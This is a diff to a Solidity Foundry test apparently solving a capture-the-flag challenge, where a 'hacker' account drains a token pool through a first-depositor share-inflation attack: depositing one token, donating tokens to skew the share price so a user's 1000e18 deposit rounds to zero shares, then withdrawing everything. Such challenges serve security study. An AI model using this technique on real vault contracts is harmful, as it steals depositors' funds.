@@ -41,19 +41,22 @@ contract Hack is Test {
         // solution
         //First we initialize the pool
         pool.initialize("j5kvj49djym590dcjbm7034uv09jih094gjcmjg90cjm58bnginxxx");
-        //pool.deposit(1000);
+
+        //then we deposit 1 to get 1 share
+        pool.deposit(1);
+
+        //now we transfer 100e18 tokens (yielding us no shares) to confuse the division
+        token.transfer(address(pool), 100e18-1);
         vm.stopPrank();
+        
+        //now the user deposits all his tokens
+        userDeposit(1000e18);
 
-        //Now we wait until a user deposits his money    
-        userDeposit(1000);
-
+        //now we withdraw all our shares, which should give us 1009999999999999999999 tokens
         vm.startPrank(hacker);
-        //Now we first transfer the users shares to us and then withdraw all the money from the pool
-        //pool.transferFromShare(1000, user);
-        //pool.withdrawAll();
-        token.transferFrom(address(pool), hacker, 1000);
-
+        pool.withdrawAll();
 		vm.stopPrank();
+        
         assertGt(token.balanceOf(hacker), hackerBalanceBeforeHack);
     }
 }
